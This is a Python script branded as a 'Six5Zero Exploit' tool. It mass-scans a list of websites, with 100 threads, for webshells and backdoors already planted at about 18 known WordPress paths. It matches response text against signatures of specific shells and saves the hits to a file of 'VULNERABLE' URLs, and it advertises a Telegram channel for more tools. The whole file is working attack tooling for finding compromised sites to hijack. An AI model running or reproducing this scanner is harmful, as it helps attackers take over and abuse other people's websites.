import requests, os, datetime
from multiprocessing.dummy import Pool
from colorama import Fore, init, Style

init(autoreset=True)
now = datetime.datetime.now()
date = now.strftime("%d-%m-%Y")
def FilterURLS(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site
def SixFiveZero(site):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        site = FilterURLS(site)
        Pathlist = ['/wp-content/plugins/w0rdpr3ssnew/wp-login.php','/wp-content/plugins/w0rdpr3ssnew/about.phpp','/wp-content/plugins/ccx/index.php','/wp-admin/includes/xleet-shell.php','/fosil.php','/wp-content/plugins/content-management/content.php','/ws.php','/wp-admin/user/wp-login.php','/wp-includes/images/wp-login.php','/xt/index.php', '/xleet-shell.php', '/xleet.php','/.well-known/pki-validation/wp-login.php','/wp-admin/wp-login.php','/wp-includes/wp-login.php','/cgi-bin/wp-login.php','/.wp-cli/wp-login.php','/wp-content/uploads/wp-login.php']
        for path in Pathlist:
            url = site + path
            response = requests.get(url, headers=headers,  allow_redirects=True, verify=True, timeout=15)
            if "Public Shell Version 2.0" in response.text or 'Faizzz-Chin ShellXploit' in response.text or '<pre align=center><form method=post>Password<br><input type=password name=pass' in response.text or "Yanz Webshell!" in response.text or '-rw-r--r--' in response.text:
                print(f"\t{Fore.GREEN}[✓]{Style.RESET_ALL} {site} => {Fore.GREEN}VULNERABLE{Style.RESET_ALL}")
                open(f"Wordpr3ssn3w-{date}.txt", "a").write(url + "/650.php\n")
            else:
                print(f"{Fore.RED}[✗]{Style.RESET_ALL} {site} => {Fore.RED}NOT VULNERABLE{Style.RESET_ALL}")
    except:
        pass
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f''' 

 ____  _      ____ _____              
/ ___|(_)_  _| ___|__  /___ _ __ ___  
\___ \| \ \/ /___ \ / // _ \ '__/ _ \ 
 ___) | |>  < ___) / /|  __/ | | (_) |
|____/|_/_/\_\____/____\___|_|  \___/ {Fore.RED}Wordpr3ssn3w{Style.RESET_ALL}
                                                
    [-Devloped BY @NullHextral, Six5Zero Exploit-]
    [-Join our Telegram channel for exclusive tools.(https://t.me/six5zeroexploit)-]
    ''')
    files = input("Enter List => ")
    try:
        with open(files, 'r', encoding='utf-8') as file:
            sites = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"\t{Fore.RED}[!] File Not Found{Style.RESET_ALL}")
        exit()
    with Pool(100) as nullhextral:
        nullhextral.map(SixFiveZero, sites)
if __name__ == "__main__":
    main()

